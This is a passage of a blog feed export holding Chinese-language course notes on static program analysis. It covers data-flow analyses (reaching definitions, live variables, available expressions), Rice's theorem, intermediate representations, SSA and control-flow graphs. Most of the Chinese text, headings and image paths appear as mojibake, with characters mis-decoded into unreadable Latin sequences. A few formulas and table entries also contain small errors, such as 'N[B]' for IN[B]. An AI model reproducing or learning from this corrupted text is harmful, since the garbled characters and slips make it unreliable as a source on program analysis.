src="/pl-é™æ€ç¨‹åºåˆ†æè¯¾ç¨‹ç¬”è®°ï¼ˆæ•°æ®æµåˆ†æ-åº”ç”¨ï¼‰/image-20200802175345773.png" alt="image-20200802175345773"></p><p>å¯¹äºç¬¬ä¸‰ç§æƒ…å†µä¸‹çš„å‰å‘åˆ†æï¼ŒBçš„INæ˜¯æ‰€æœ‰å…¥å‘çš„ä»£ç å—OUTçš„meetï¼›å¯¹äºç¬¬äºŒç§æƒ…å†µä¸‹çš„åå‘åˆ†æï¼ŒBçš„OUTæ˜¯æ‰€æœ‰å‡ºå‘ä»£ç å—INçš„meetã€‚</p><h1 id="Reaching-Definitions-Analysis"><a href="#Reaching-Definitions-Analysis" class="headerlink" title="Reaching Definitions Analysis"></a>Reaching Definitions Analysis</h1><blockquote><p>A definition $d$ at program point $p$ reaches a point $q$ if there is a path from $p$ to $q$ such that $d$ is not â€œkilledâ€ along that path.</p></blockquote><p>å¯¹äºåœ¨ç¨‹åºç‚¹ $p$ å¤„å˜é‡vçš„<strong>å®šä¹‰d</strong>ï¼Œæ£€æµ‹å…¶åœ¨$ p\sim q$çš„è·¯å¾„ä¸Šæ˜¯å¦æœ‰æ–°çš„å®šä¹‰ï¼ˆå¯ä»¥ç”¨äºç©ºæŒ‡é’ˆé—®é¢˜ï¼‰</p><h2 id="ç®—æ³•è®¾è®¡"><a href="#ç®—æ³•è®¾è®¡" class="headerlink" title="ç®—æ³•è®¾è®¡"></a>ç®—æ³•è®¾è®¡</h2><ol><li><p>Data Flow Values<br> ç”¨bit vecotrè¡¨ç¤ºé›†åˆï¼Œé›†åˆä¸­å…ƒç´ è¡¨ç¤ºæ¯ä¸€åˆ°è¾¾è¯¥ç‚¹çš„è¯­å¥<br> e.g. D1, D2, â€¦ , Dn=01â€¦0 (è¡¨ç¤ºD2å®šä¹‰åœ¨å½“ä¸”ä½ç½®æœ‰æ–°å®šä¹‰)</p></li><li><p>å®šä¹‰Transfer Functionå’ŒControl-flow Handing</p><p> <strong>Transfer Functionï¼š</strong></p><p> å¯¹äºä¸€ä¸ªå®šä¹‰è¯­å¥<code>D: v = x op y</code>ï¼Œkillï¼ˆåœ¨é›†åˆï¼‰ä¸vç›¸å…³çš„å…¶ä»–è¯­å¥ï¼Œå¹¶åœ¨é›†åˆä¸­åŠ å…¥Dï¼Œå³ï¼š</p><script type="math/tex; mode=display">\mathrm{OUT}[B]=gen_{B} \cup\left(\mathrm{IN}[B]-k i l l_{B}\right)</script><p> <strong>Control-flow Handingï¼š</strong></p><p> å½“å¤šä¸ªä»£ç å—æ±‡èšæ—¶ï¼Œåˆå¹¶æ‰€æœ‰çš„å®šä¹‰ï¼ˆmayï¼‰</p><script type="math/tex; mode=display">\mathrm{IN}[B]=\bigcup_{P \text { a predecessor of } B} OUT [P]</script></li><li><p>åº”ç”¨ç»å…¸çš„æ•°æ®æµåˆ†æç®—æ³•æ¡†æ¶ï¼ˆIterative algorithmï¼‰<br> <img src="/pl-é™æ€ç¨‹åºåˆ†æè¯¾ç¨‹ç¬”è®°ï¼ˆæ•°æ®æµåˆ†æ-åº”ç”¨ï¼‰/8890_1.png" alt="Iterative algorithm"></p><h2 id="éå†ç»“æœ"><a href="#éå†ç»“æœ" class="headerlink" title="éå†ç»“æœ"></a>éå†ç»“æœ</h2><p><img src="/pl-é™æ€ç¨‹åºåˆ†æè¯¾ç¨‹ç¬”è®°ï¼ˆæ•°æ®æµåˆ†æ-åº”ç”¨ï¼‰/image-20200802193730918.png" alt="image-20200802193730918"></p></li></ol><h2 id="ä¸ºä»€ä¹ˆèƒ½åˆ°ä¸åŠ¨ç‚¹-fixed-point"><a href="#ä¸ºä»€ä¹ˆèƒ½åˆ°ä¸åŠ¨ç‚¹-fixed-point" class="headerlink" title="ä¸ºä»€ä¹ˆèƒ½åˆ°ä¸åŠ¨ç‚¹(fixed point)"></a>ä¸ºä»€ä¹ˆèƒ½åˆ°ä¸åŠ¨ç‚¹(fixed point)</h2><p>å†æ¬¡è€ƒè™‘Transfer Functionï¼š</p><script type="math/tex; mode=display">\mathrm{OUT}[B]=gen_{B} \cup\left(\mathrm{IN}[B]-k i l l_{B}\right)</script><ul><li>å› ä¸º genå’Œkillæ˜¯ä¸å˜çš„</li><li>å½“æ–°çš„å˜åŒ–è¿›æ¥æ—¶ï¼Œç»è¿‡killsï¼Œå­˜åœ¨$survivor_s$åŠ å…¥OUT[S]</li><li>å› æ­¤é‚£äº›åŠ å…¥åˆ°OUT[S]çš„æ–°å˜åŒ–ï¼Œè¦ä¹ˆæ¥è‡ªäºgenï¼Œè¦ä¹ˆæ¥è‡ªäº$survivor_s$ï¼Œè€Œè¿™äº›å˜åŒ–å°†æ°¸è¿œä¿ç•™ï¼ˆé›†åˆä¸­æ°¸è¿œå­˜åœ¨è¿™äº›ä½ç½®ï¼‰</li><li>å› æ­¤OUTçš„å˜åŒ–æ˜¯å•è°ƒå¢çš„(åªä¼š0-&gt;1,1-&gt;1)</li></ul><p>æ€»ç»“ä¸‹æ¥ï¼Œæ¯ä¸ªBBçš„Transfer Functionæ˜¯ä¸€ä¸ªå•è°ƒå¢å‡½æ•°ï¼Œåˆå› ä¸ºå€¼åŸŸæ˜¯æœ‰ä¸Šé™çš„ï¼ˆæœ€å¤§ä¸åŠ¨ç‚¹ï¼‰ï¼Œå› æ­¤ç®—æ³•æœ€ç»ˆä¼šåœæ­¢ã€‚</p><h1 id="Live-Variable-Analysis"><a href="#Live-Variable-Analysis" class="headerlink" title="Live Variable Analysis"></a>Live Variable Analysis</h1><blockquote><p>Live variables analysis tells whether the value of variable $v$ at program point $p$ could be used along some path in CFG starting at $p$. If so , $v$ is live at $p$; otherwise, $v$ is dead at $p$.</p></blockquote><p>å¯¹äºåœ¨CFGç¨‹åºç‚¹ $p$ï¼ˆæ³¨æ„ $p$ æ˜¯ä¸€ä¸ªå®šç‚¹ï¼‰ä¸Šå®šä¹‰çš„<strong>å˜é‡ $v$ </strong>ï¼Œåœ¨æŸæ¡è·¯å¾„ä¸Šå¯èƒ½è¢«ä½¿ç”¨ï¼ˆ$v$ åœ¨ä½¿ç”¨å‰ä¸è¢«é‡æ–°å®šä¹‰ï¼‰ï¼Œé‚£ä¹ˆç§° $v$ åœ¨ $p$ ä¸Šæˆæ´»ã€‚<br>ï¼ˆä½¿ç”¨åœºæ™¯ï¼šå¯„å­˜å™¨ç”¨å®Œä¹‹åï¼Œæ£€æŸ¥å“ªä¸ªå¯„å­˜å™¨å¯ä»¥è¢«æ¸…é™¤â€”â€”è‹¥å¯„å­˜å™¨ä¸­çš„å˜é‡deadï¼‰</p><h2 id="ç®—æ³•è®¾è®¡-1"><a href="#ç®—æ³•è®¾è®¡-1" class="headerlink" title="ç®—æ³•è®¾è®¡"></a>ç®—æ³•è®¾è®¡</h2><ol><li><p>Data Flow Valuesï¼Œä¾ç„¶ç”¨bit vectorï¼Œ<strong>æ³¨æ„è¿™æ¬¡è®°å½•å˜é‡</strong><br> å¦‚ï¼šV1,V2,â€¦,Vn=01â€¦0 ï¼ˆV2åœ¨pä¸Šçš„å®šä¹‰è¢«ä½¿ç”¨i.e.,ä¸èƒ½æ¸…ç©ºV2å¯„å­˜å™¨ï¼‰</p></li><li><p>å®šä¹‰Transfer Functionå’ŒControl-flow Handing</p><p> è®¨è®ºforwardè¿˜æ˜¯backwardï¼Œ<strong>æŠŠå˜é‡å½“å¯„å­˜å™¨æƒ³</strong>ï¼Œå½“å†³å®šä¸€ä¸ªå¯„å­˜å™¨æ˜¯å¦å¯ä»¥æ¸…ç©ºçš„æ—¶å€™ï¼Œéœ€è¦å¾€åçœ‹ï¼Œåé¢çš„ç¨‹åºæ˜¯å¦ç”¨åˆ°è¿™ä¸ªå¯„å­˜å™¨ï¼Œå› æ­¤ç”¨backwardã€‚</p><p> <strong>Transfer Functionï¼š</strong></p><script type="math/tex; mode=display">\mathrm{IN}[B]=use_{B} \cup\left(\mathrm{OUT}[B]-def_{B}\right)</script><p> å…¶ä¸­ï¼Œ$IN[B]$æŒ‡våœ¨Bä¸­é‡å®šä¹‰å‰è¢«ä½¿ç”¨ï¼Œ$OUT[B]$æŒ‡våœ¨Bä»£ç å—ä¸­æ²¡æœ‰é‡å®šä¹‰ï¼Œ$def_B$æŒ‡våœ¨Bä¸­è¢«é‡å®šä¹‰ã€‚</p><p> <strong>Control-flow Handingï¼š</strong></p><p> may analysisï¼Œä¾æ—§æ˜¯âˆªï¼š</p><script type="math/tex; mode=display">\mathrm{OUT}[\mathrm{B}]=\bigcup_{S \text{ a successor of B}}  {\mathrm{IN}[\mathrm{S}]}</script></li><li><p>ä¸åŠ¨ç‚¹ç®—æ³•<br>  <img src="/pl-é™æ€ç¨‹åºåˆ†æè¯¾ç¨‹ç¬”è®°ï¼ˆæ•°æ®æµåˆ†æ-åº”ç”¨ï¼‰/image-20200802203143027.png" alt="image-20200802203143027"></p><h2 id="åˆ†æç»“æœ"><a href="#åˆ†æç»“æœ" class="headerlink" title="åˆ†æç»“æœ"></a>åˆ†æç»“æœ</h2><p><img src="/pl-é™æ€ç¨‹åºåˆ†æè¯¾ç¨‹ç¬”è®°ï¼ˆæ•°æ®æµåˆ†æ-åº”ç”¨ï¼‰/image-20200802202534370.png" alt="image-20200802202534370"></p></li></ol><h1 id="Avaliable-Expression-Analysis"><a href="#Avaliable-Expression-Analysis" class="headerlink" title="Avaliable Expression Analysis"></a>Avaliable Expression Analysis</h1><blockquote><p>An expression $x \text{ op } y$ is available at program point $p$ if (1) all paths from the entry to $p$ must passthrough the evaluation of , $x \text{ op } y$and (2) after the last evaluation of $x \text{ op } y$, there is no redefinition of $x \text{ op } y$.</p></blockquote><p>è¡¨è¾¾å¼ $x \text{ op } y$ ä¸ºavailbable å½“ä¸”ä»…å½“ ï¼ˆ1ï¼‰æ‰€æœ‰è·¯å¾„éƒ½ç»è¿‡ $x \text{ op } y$ ï¼ˆ2ï¼‰æœ€åä¸€ä¸ªè®¡ç®—  $x \text{ op } y$ åï¼Œä¸å†æœ‰ $x$ å’Œ$y$ çš„é‡æ–°èµ‹å€¼ã€‚</p><p>å¦‚æœè¡¨è¾¾å¼availableï¼Œåˆ™ä¼˜åŒ–æœ€åä¸€æ¬¡çš„è®¡ç®—ï¼Œä¾‹å¦‚ï¼š<br><img src="/pl-é™æ€ç¨‹åºåˆ†æè¯¾ç¨‹ç¬”è®°ï¼ˆæ•°æ®æµåˆ†æ-åº”ç”¨ï¼‰/image-20200802204136008.png" alt="image-20200802204136008"></p><p>cå¯ä»¥è¢«ä¼˜åŒ–ï¼Œä¾‹å¦‚ï¼Œå°†aï¼Œbï¼Œcå…¨è½¬åŒ–ä¸ºyï¼Œæœ€åä¸€æ­¥åˆ™ä¸ç”¨è®¡ç®—ï¼ˆä¸è®ºèµ°ä»€ä¹ˆåˆ†æ”¯ï¼Œæœ€åçš„téƒ½ä¸ç”¨è®¡ç®—ï¼‰</p><h2 id="ç®—æ³•è®¾è®¡-2"><a href="#ç®—æ³•è®¾è®¡-2" class="headerlink" title="ç®—æ³•è®¾è®¡"></a>ç®—æ³•è®¾è®¡</h2><ol><li><p>Data Flow Values<br> availableçš„è¡¨è¾¾å¼é›†åˆï¼Œå¯ç”¨bitVectorè¡¨ç¤ºï¼Œå¦‚ï¼š</p><p>E1,E2,â€¦,En=01â€¦0(E2ä¸ºavailable)</p></li><li><p>å®šä¹‰Transfer Functionå’ŒControl-flow Handing</p><p> <strong>Transfer Functionï¼š</strong></p><script type="math/tex; mode=display">\mathrm{OUT}[B]=gen_{B} \cup\left(\mathrm{IN}[B]-kill_{B}\right)</script><p> è¿™é‡Œçš„$kill_{B}$æŒ‡åˆ é™¤è¡¨è¾¾å¼ï¼Œè¿™äº›è¡¨è¾¾å¼çš„å˜é‡åœ¨å½“å‰å—Bä¸­è¢«é‡æ–°å®šä¹‰ã€‚</p><p> <strong>Control-flow Handingï¼š</strong></p><script type="math/tex; mode=display">\mathrm{N}[B]=\bigcap_{P a \text { predecessor of } B} OUT [P]</script><p> must analysisï¼Œç”±â€œâˆªâ€å˜æˆäº†â€œâˆ©â€</p></li><li><p>ç®—æ³•ï¼Œæ³¨æ„æ¯ä¸ªbbçš„åˆå§‹åŒ–ï¼Œå˜æˆäº†â€œAllâ€ï¼Œå³åˆå§‹çŠ¶æ€æ‰€æœ‰è¡¨è¾¾å¼éƒ½æ˜¯availableçš„ï¼ˆåå‘æ€ç»´ï¼Œå¦‚æœåˆå§‹åŒ–ä¸º0ï¼Œé‚£ä¹ˆ$\cap$åæ’ä¸º0ï¼Œè®¡ç®—æ— æ•ˆï¼‰<br> <img src="/pl-é™æ€ç¨‹åºåˆ†æè¯¾ç¨‹ç¬”è®°ï¼ˆæ•°æ®æµåˆ†æ-åº”ç”¨ï¼‰/image-20200802205253641.png" alt="image-20200802205253641"></p></li></ol><h1 id="ç»¼åˆæ¯”è¾ƒ"><a href="#ç»¼åˆæ¯”è¾ƒ" class="headerlink" title="ç»¼åˆæ¯”è¾ƒ"></a>ç»¼åˆæ¯”è¾ƒ</h1><div class="table-container"><table><thead><tr><th></th><th>Reaching Definitions</th><th>Live Variables</th><th>Available</th></tr></thead><tbody><tr><td>Domain(ç ”ç©¶å¯¹è±¡çš„é›†åˆ)</td><td>å®šä¹‰é›†åˆ</td><td>å˜é‡é›†åˆ</td><td>è¡¨è¾¾å¼é›†åˆ</td></tr><tr><td>Direction(æ•°æ®çŠ¶æ€çš„ä¾èµ–å…³ç³»)</td><td>Forwards</td><td>Backwards</td><td>Forwards</td></tr><tr><td>May/Must(åº”ç”¨åœºæ™¯)</td><td>May</td><td>May</td><td>Must</td></tr><tr><td>Boundary(Direction&amp;May/Must)</td><td>$\mathrm{OUT}[entry]=\emptyset$</td><td>$\mathrm{IN}[exit]=\emptyset$</td><td>$\mathrm{OUT}[entry]=\emptyset$</td></tr><tr><td>Initialization(Direction&amp;May/Must)</td><td>$\mathrm{B}[entry]=\emptyset$</td><td>$\mathrm{In}[B]=\emptyset$</td><td>$\mathrm{OUT}[B]=\emptyset$</td></tr><tr><td>Transfer function</td><td>$\mathrm{OUT}=gen \cup (\mathrm{IN}-kill)$</td><td>-</td><td>-</td></tr><tr><td>Meet(May/Must)</td><td>$\cup$</td><td>$\cup$</td><td>$\cap$</td></tr></tbody></table></div>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;Overview-amp-Preliminaries&quot;&gt;&lt;a href=&quot;#Overview-amp-Preliminaries&quot; class=&quot;headerlink&quot; title=&quot;Overview &amp;amp;  Preliminaries&quot;&gt;&lt;/a&gt;Overview &amp;amp;  Preliminaries&lt;/h1&gt;&lt;p&gt;ä¸¤ç±»åˆ†æï¼š&lt;/p&gt;&lt;ul&gt;
&lt;li&gt;&lt;p&gt;may Analysisï¼šover-approximation&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;must Analysisï¼šunder-approximation&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;å®é™…ä¸Šéƒ½æ˜¯ä¸ºäº†safety of analysisã€‚&lt;/p&gt;&lt;h2 id=&quot;å¯¹æ•°æ®æµåˆ†æçš„å‡ ç§è§£é‡Š&quot;&gt;&lt;a href=&quot;#å¯¹æ•°æ®æµåˆ†æçš„å‡ ç§è§£é‡Š&quot; class=&quot;headerlink&quot; title=&quot;å¯¹æ•°æ®æµåˆ†æçš„å‡ ç§è§£é‡Š&quot;&gt;&lt;/a&gt;å¯¹æ•°æ®æµåˆ†æçš„å‡ ç§è§£é‡Š&lt;/h2&gt;
    
    </summary>
    
      <category term="Program Language" scheme="http://anemone.top/categories/Program-Language/"/>
    
    
      <category term="ç™½ç›’æ‰«æ" scheme="http://anemone.top/tags/%E7%99%BD%E7%9B%92%E6%89%AB%E6%8F%8F/"/>
    
      <category term="é™æ€ç¨‹åºåˆ†æ" scheme="http://anemone.top/tags/%E9%9D%99%E6%80%81%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90/"/>
    
      <category term="æ•°æ®æµåˆ†æ" scheme="http://anemone.top/tags/%E6%95%B0%E6%8D%AE%E6%B5%81%E5%88%86%E6%9E%90/"/>
    
      <category term="PL" scheme="http://anemone.top/tags/PL/"/>
    
  </entry>
  
  <entry>
    <title>é™æ€ç¨‹åºåˆ†æè¯¾ç¨‹ç¬”è®°ï¼ˆç®€ä»‹ï¼‰</title>
    <link href="http://anemone.top/pl-%E9%9D%99%E6%80%81%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0%EF%BC%88%E7%AE%80%E4%BB%8B%EF%BC%89/"/>
    <id>http://anemone.top/pl-é™æ€ç¨‹åºåˆ†æè¯¾ç¨‹ç¬”è®°ï¼ˆç®€ä»‹ï¼‰/</id>
    <published>2020-08-02T08:34:13.000Z</published>
    <updated>2020-08-15T09:46:31.427Z</updated>
    
    <content type="html"><![CDATA[<p>æ¯æ ¡è®¡ç®—æœºé™¢çš„ææ¨¾ã€è°­æ·»è€å¸ˆè®²çš„è¯¾ï¼Œå¬äº†ç¬¬ä¸€èŠ‚è¯¾å°±å“­äº†ï¼Œå†³å®šåšä¸€ä¸‹ç¬”è®°ï¼Œè¯¾ç¨‹ç½‘ç«™ <a href="https://pascal-group.bitbucket.io/teaching.htmlã€‚" target="_blank" rel="noopener">https://pascal-group.bitbucket.io/teaching.htmlã€‚</a></p><h1 id="PLçŸ¥è¯†ä½“ç³»"><a href="#PLçŸ¥è¯†ä½“ç³»" class="headerlink" title="PLçŸ¥è¯†ä½“ç³»"></a>PLçŸ¥è¯†ä½“ç³»</h1><p><img src="/pl-é™æ€ç¨‹åºåˆ†æè¯¾ç¨‹ç¬”è®°ï¼ˆç®€ä»‹ï¼‰/image-20200802113608162.png" alt="image-20200802113608162"></p><p>å¦‚ä¸Šå›¾æ‰€ç¤ºï¼Œä¸»è¦åˆ†ä¸‰å¤§å—ï¼Œç†è®ºéƒ¨åˆ†åŒ…å«è¯­è¨€è®¾è®¡ã€ç±»å‹ç³»ç»Ÿã€è¯­ä¹‰å’Œé€»è¾‘æ£€æŸ¥ï¼›ç¯å¢ƒéƒ¨åˆ†åŒ…å«ç¼–è¯‘å™¨å’Œè¿è¡Œæ—¶è®¾è®¡ç­‰ï¼›åº”ç”¨éƒ¨åˆ†åŒ…å«ç¨‹åºåˆ†æã€ç¨‹åºéªŒè¯å’Œç¨‹åºç”Ÿæˆç­‰ï¼Œæœ¬è¯¾ç¨‹ä¸»è¦å…³æ³¨äºåº”ç”¨æ–¹é¢çš„ç¨‹åºåˆ†æã€‚</p><a id="more"></a><h1 id="Riceâ€™s-Theoremï¼ˆè±æ–¯å®šç†ï¼‰"><a href="#Riceâ€™s-Theoremï¼ˆè±æ–¯å®šç†ï¼‰" class="headerlink" title="Riceâ€™s Theoremï¼ˆè±æ–¯å®šç†ï¼‰"></a>Riceâ€™s Theoremï¼ˆè±æ–¯å®šç†ï¼‰</h1><blockquote><p>Any non-trivial property of the behavior of programs in a r.e. language is undecidable.</p></blockquote><p>å¯¹é€’å½’å¯æšä¸¾è¯­è¨€æ¥è¯´ï¼Œä¸å­˜åœ¨ä¸€ä¸ªå®Œç¾ï¼ˆSound&amp;Completeï¼‰çš„ï¼Œç”¨äºåˆ¤å®šç¨‹åºä¸­non-trivialçš„å±æ€§çš„æ–¹æ³•ã€‚</p><p>è¿™é‡Œâ€œnon-trivial propertyâ€å¯ä»¥ç†è§£ä¸ºç¨‹åºåˆ†æçš„ç§ç§ç›®çš„ï¼Œå¦‚å˜é‡æ˜¯å¦ç©ºæŒ‡é’ˆã€æ˜¯å¦å­˜åœ¨ä¿¡æ¯æ³„éœ²ç­‰ã€‚</p><h1 id="å¯é æ€§å’Œå®Œå¤‡æ€§ï¼ˆsoundness-amp-completenessï¼‰"><a href="#å¯é æ€§å’Œå®Œå¤‡æ€§ï¼ˆsoundness-amp-completenessï¼‰" class="headerlink" title="å¯é æ€§å’Œå®Œå¤‡æ€§ï¼ˆsoundness&amp;completenessï¼‰"></a>å¯é æ€§å’Œå®Œå¤‡æ€§ï¼ˆsoundness&amp;completenessï¼‰</h1><p>ç”±è±æ–¯å®šç†ï¼Œåˆ†ææ—¶å‡ºç°soundå’Œcompleteæƒ…å†µï¼Œå­˜åœ¨ä¸¤ç§å¦¥åæ–¹æ¡ˆï¼š</p><ul><li>Compromise soundnessï¼šå¦¥åå¯é æ€§ï¼Œå³æ¥å—è¯¯æŠ¥ï¼Œè¯¥æ–¹æ¡ˆæ˜¯é™æ€åˆ†æè¾ƒå¸¸è§</li><li>Compromise completenessï¼šå¦¥åå®Œå¤‡æ€§ï¼Œå³æ¥å—æ¼æŠ¥</li></ul><p>è¯¯æŠ¥ï¼ˆFalse positiveï¼‰ä¸æ¼æŠ¥ï¼ˆFalse negativeï¼‰å…³ç³»å¦‚ä¸‹å›¾æ‰€ç¤ºï¼š</p><p><img src="/pl-é™æ€ç¨‹åºåˆ†æè¯¾ç¨‹ç¬”è®°ï¼ˆç®€ä»‹ï¼‰/image-20200802115612020.png" alt="image-20200802115612020"></p><h1 id="ç®€å•çš„ç¨‹åºåˆ†ææ¡ˆä¾‹"><a href="#ç®€å•çš„ç¨‹åºåˆ†ææ¡ˆä¾‹" class="headerlink" title="ç®€å•çš„ç¨‹åºåˆ†ææ¡ˆä¾‹"></a>ç®€å•çš„ç¨‹åºåˆ†ææ¡ˆä¾‹</h1><p>åˆ†æåœ¨ä»£ç på¤„å˜é‡vçš„æ­£è´Ÿ(+, -, 0)ã€‚</p><h2 id="å®šä¹‰æ•°æ®æŠ½è±¡"><a href="#å®šä¹‰æ•°æ®æŠ½è±¡" class="headerlink" title="å®šä¹‰æ•°æ®æŠ½è±¡"></a>å®šä¹‰æ•°æ®æŠ½è±¡</h2><ul><li>$+$ï¼šæ­£</li><li>$-$ï¼šè´Ÿ</li><li>$0$ï¼šé›¶</li><li>$\top$ï¼šæœªçŸ¥</li><li>$\perp$ï¼šæœªå®šä¹‰</li></ul><h2 id="å®šä¹‰Transfer-Function"><a href="#å®šä¹‰Transfer-Function" class="headerlink" title="å®šä¹‰Transfer Function"></a>å®šä¹‰Transfer Function</h2><p>å³è¯»å–ä¸€ä¸ªäºŒå…ƒæ“ä½œstatementsï¼Œè¾“å‡ºç¬¦å·æ˜¯ä»€ä¹ˆï¼Œå¦‚ä¸‹è¡¨ï¼š</p><p><img src="/pl-é™æ€ç¨‹åºåˆ†æè¯¾ç¨‹ç¬”è®°ï¼ˆç®€ä»‹ï¼‰/image-20200802154058197.png" alt="image-20200802154058197"></p><h2 id="å®šä¹‰Control-Flow-Merge"><a href="#å®šä¹‰Control-Flow-Merge" class="headerlink" title="å®šä¹‰Control Flow Merge"></a>å®šä¹‰Control Flow Merge</h2><p>åœ¨CFGä¸­æ±‡èšç‚¹ä¸­è¦åˆå¹¶æƒ…å†µ<br><img src="/pl-é™æ€ç¨‹åºåˆ†æè¯¾ç¨‹ç¬”è®°ï¼ˆç®€ä»‹ï¼‰/image-20200802154239519.png" alt="image-20200802154239519"></p><h1 id="ç¼–è¯‘å™¨vs-é™æ€åˆ†æå™¨"><a href="#ç¼–è¯‘å™¨vs-é™æ€åˆ†æå™¨" class="headerlink" title="ç¼–è¯‘å™¨vs.é™æ€åˆ†æå™¨"></a>ç¼–è¯‘å™¨vs.é™æ€åˆ†æå™¨</h1><ul><li><p>ç¼–è¯‘å™¨ï¼š<br>è¯æ³•åˆ†æï¼ˆäº§ç”Ÿtokensï¼‰â†’è¯­æ³•åˆ†æï¼ˆäº§ç”ŸASTï¼‰â†’è¯­ä¹‰åˆ†æï¼ˆåŒ…æ‹¬ç±»å‹æ£€æŸ¥ï¼Œäº§ç”ŸDecorated ASTï¼‰â†’ç¿»è¯‘ï¼ˆäº§ç”ŸIRï¼‰â†’ä»£ç ç”Ÿæˆ </p></li><li><p>é™æ€åˆ†æï¼š<br>é™æ€åˆ†æåŸºäºIR</p></li></ul><h1 id="ASTå’ŒIR"><a href="#ASTå’ŒIR" class="headerlink" title="ASTå’ŒIR"></a>ASTå’ŒIR</h1><h2 id="AST"><a href="#AST" class="headerlink" title="AST"></a>AST</h2><ol><li>ç¬¦åˆè¯­æ³•ç»“æ„</li><li>ä¾èµ–äºç‰¹å®šè¯­è¨€</li><li>é€‚åˆäºç±»å‹æ£€æŸ¥</li><li>ç¼ºå¤±æ§åˆ¶æµä¿¡æ¯</li></ol><h2 id="IR"><a href="#IR" class="headerlink" title="IR"></a>IR</h2><ol><li>æ¥è¿‘æœºå™¨ä»£ç </li><li>è¯­è¨€æ— å…³</li><li>å«æœ‰æ§åˆ¶æµä¿¡æ¯</li></ol><h2 id="ä¸‰åœ°å€ç "><a href="#ä¸‰åœ°å€ç " class="headerlink" title="ä¸‰åœ°å€ç "></a>ä¸‰åœ°å€ç </h2><p>ä¸€ç§å¸¸ç”¨çš„IRï¼š</p><ol><li>å³ä¾§åªæœ‰ä¸€ä¸ªæ“ä½œ</li><li>æ¯ä¸€è¯­å¥æœ€å¤šæœ‰ä¸‰ä¸ªâ€œåœ°å€â€ï¼ˆå˜é‡ï¼Œå¸¸é‡ï¼‰</li></ol><p>Soot ä¸­çš„ä¸‰åœ°å€ç :</p><ul><li><code>@parameter</code>ï¼šå‡½æ•°å‚æ•°</li><li><p><code>$x</code>ï¼šä¸´æ—¶å˜é‡</p></li><li><p><code>&lt;method signature&gt;</code>ï¼šç±»+è¿”å›å€¼ç±»å‹+æ–¹æ³•å+å‡½æ•°å‚æ•°ç±»å‹</p></li><li><code>&lt;init&gt;</code>ï¼šæ„é€ å‡½æ•°</li><li><code>&lt;clinit&gt;</code>ï¼šç±»åˆå§‹åŒ–å‡½æ•°ï¼ˆé™æ€å˜é‡åˆå§‹åŒ–ç­‰ï¼‰</li><li><code>invokespecial</code>ï¼šè°ƒç”¨æ„é€ å‡½æ•°ã€çˆ¶ç±»æ–¹æ³•ã€ç§æœ‰æ–¹æ³•</li><li><code>invokevirtual</code>ï¼šå®ä¾‹æ–¹æ³•è°ƒç”¨ï¼ˆvirtual dispatchï¼‰</li><li><code>invokeinterface</code>ï¼šä¸èƒ½ä¼˜åŒ–ã€è°ƒç”¨æ¥å£ã€æ£€æŸ¥æ¥å£å®ç°</li><li><code>invokestatic</code>ï¼šè°ƒç”¨é™æ€æ–¹æ³•</li><li><code>invokedynamic</code>ï¼šè¿è¡Œå…¶ä»–åŠ¨æ€è¯­è¨€ </li></ul><h2 id="SSA"><a href="#SSA" class="headerlink" title="SSA"></a>SSA</h2><p>ä¸€ç§ç‰¹æ®Šçš„ä¸‰åœ°å€ç :</p><ul><li>æ¯æ¬¡èµ‹å€¼æœ‰æ–°çš„å˜é‡å</li><li>æ¯ä¸€ä¸ªå˜é‡éƒ½æœ‰å”¯ä¸€å®šä¹‰</li></ul><p>ä¼˜åŠ¿ï¼š</p><ul><li>flow-insensitive analysisæ›´å‡†ç¡®</li><li>å®¹æ˜“åšä¼˜åŒ–ç®—æ³•</li></ul><p>åŠ£åŠ¿ï¼š</p><ul><li>å¼•å…¥å¤§é‡å˜é‡</li><li>ç¼–è¯‘æ—¶æœ‰æ€§èƒ½é—®é¢˜</li></ul><h1 id="Control-Flow-Graph"><a href="#Control-Flow-Graph" class="headerlink" title="Control Flow Graph"></a>Control Flow Graph</h1><p>Basic Blockæ˜¯CFGçš„ä¸»ä½“ã€‚</p><ul><li>Basic Blockï¼šä¸€ä¸ªæœ€é•¿çš„è¯­å¥åºåˆ—ï¼Œå¹¶ä¿è¯å…¥å£åªèƒ½åœ¨æœ€å¼€å§‹æŒ‡ä»¤ä¸”å‡ºå£åªèƒ½åœ¨æœ€åä¸€ä¸ªæŒ‡ä»¤</li></ul><h2 id="æ„é€ Basic-Blocks"><a href="#æ„é€ Basic-Blocks" class="headerlink" title="æ„é€ Basic Blocks"></a>æ„é€ Basic Blocks</h2><ul><li>Inputï¼šç¨‹åºPçš„ä¸‰åœ°å€ç åºåˆ—</li><li><p>Outputï¼šç¨‹åºPçš„basic blocks</p></li><li><p>ç®—æ³•</p><ol><li><p>ç¡®å®šleadersï¼ˆæ¯ä¸ªbasic blockçš„å¤´ï¼‰</p><ul><li>åºåˆ—ä¸­çš„ç¬¬ä¸€ä¸ªæŒ‡ä»¤</li><li>è·³è½¬æŒ‡ä»¤çš„ç›®æ ‡æŒ‡ä»¤</li><li>è·³è½¬æŒ‡ä»¤çš„ä¸‹ä¸€æ¡æŒ‡ä»¤</li><li>returnæŒ‡ä»¤</li></ul></li><li><p>æ¯ä¸ªBasic BlockåŒ…å«å…¶leaderè‡³ä¸‹ä¸€ä¸ªleaderå‰çš„æ‰€æœ‰è¯­å¥</p></li></ol></li></ul><h2 id="æ„é€ CFG"><a href="#æ„é€ CFG" class="headerlink" title="æ„é€ CFG"></a>æ„é€ CFG</h2><ul><li>æ·»åŠ è¾¹ï¼Œåœ¨ä»¥ä¸‹ä¸¤ç§æƒ…å†µä¸‹ï¼š<ul><li>ä»£ç å—å­˜åœ¨å…ˆåé¡ºåºï¼Œä¸”ä¸å­˜åœ¨æ— æ¡ä»¶è·³è½¬</li><li>æ¯ä¸ªè·³è½¬é—´</li></ul></li><li>æ·»åŠ entryå’ŒexitèŠ‚ç‚¹</li></ul>]]></content>
    
    <summary type="html">
    
